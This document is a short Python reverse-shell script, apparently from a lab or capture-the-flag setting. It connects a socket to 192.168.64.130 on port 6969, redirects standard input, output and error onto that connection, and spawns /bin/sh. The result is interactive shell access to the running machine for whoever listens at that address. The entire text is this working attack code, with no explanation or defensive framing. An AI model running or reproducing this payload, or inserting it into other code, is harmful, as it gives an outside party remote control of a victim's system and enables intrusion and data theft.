import sys,socket,os,pty
s = socket.socket()
s.connect(("192.168.64.130", 6969))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")